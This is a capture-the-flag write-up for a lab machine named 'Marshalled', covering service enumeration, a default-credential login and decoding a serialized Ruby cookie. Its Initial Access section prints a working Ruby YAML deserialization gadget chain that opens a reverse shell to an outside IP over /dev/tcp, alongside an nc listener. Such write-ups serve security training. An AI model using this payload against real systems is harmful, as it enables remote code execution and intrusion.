# Marshalled

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.151.237

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 22

We run nmap to check the authentications possible through ssh.

```shell
# Check authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.151.237

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

## Enumerating port 80

We used feroxbuster to enumerate port 80 but found nothing.

```shell
# Enum dir
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 1 -x php,asp,aspx,html,txt,pdf -C 404,502 -u http://192.168.151.237
```

## Enumerating subdomains

As we didn't get any feedback from feroxbuster, we used ffuf to enumerate the application's subdomains and found the monitoring subdomain.

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://pc.com -H 'Host: FUZZ.pc.com' -fs 868

monitoring     [Status: 200, Size: 4045, Words: 956, Lines: 103, Duration: 816ms]
```

We add the subdomain to the hosts file.

```shell
# Setting hosts file
sudo nano /etc/hosts
192.168.229.237 monitoring.marshalled.pg
```

We used the internet browser to access the content available at `monitoring.marshalled.pg` and found a site with a login field. By testing the admin:admin credentials we were able to log in to the application.

We return to the login page and intercept the POST request with Burpsuite using the validated credentials. We can see that if the `remember_me` parameter is set to `on` in the request, the response comes back with an extra `remember_token` cookie, encoded in base64. This cookie is incorporated into a second GET request to the server.

We throw the encoded cookie into CyberChef and decode it using URL Decode and then From Base64, revealing a YAML file with bcrypt password digest.

```shell
# Cookie (decoded)
--- !ruby/object:User
concise_attributes:
- !ruby/object:ActiveModel::Attribute::FromDatabase
  name: id
  value_before_type_cast: 104
- !ruby/object:ActiveModel::Attribute::FromDatabase
  name: username
  value_before_type_cast: admin
- !ruby/object:ActiveModel::Attribute::FromDatabase
  name: password_digest
  value_before_type_cast: "$2a$12$ogjC9QG2BTiLQohzwmR7au3JHj/MwqWsMb2RrsHN7NYilSN.SFejO"
...
new_record: false
active_record_yaml_version: 2
```

We realized that there is an insecure deserialization vulnerability in the Ruby YAML package, allowing us to upload a malicious YAML via the token cookie.

## Initial Access

We open a listener and prepare the following payload encoded first in base64 and then with URL Encode (Encode all special chars).

```shell
# Listener
rlwrap -cAra nc -vnlp 443

# String
---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: bash -c "bash -i >& /dev/tcp/192.168.45.242/443 0>&1"
          method_id: :resolve

# TTY Upgrade
/usr/bin/python3.8 -c "import pty;pty.spawn('/bin/bash')"
```

## Privilege Escalation

We started trying to escalate privileges by looking for binaries with the SUID permission and found `cname`.

```shell
# SUID
find / -type f -perm -4000 2>/dev/null

/usr/bin/cname
```

The privilege escalation method was a memory exploit via the `cname` binary.

```shell
# Evidence
cat /home/dev-acc/local.txt
39993e8a1bf7ab4287b069e4b7f420a7
```
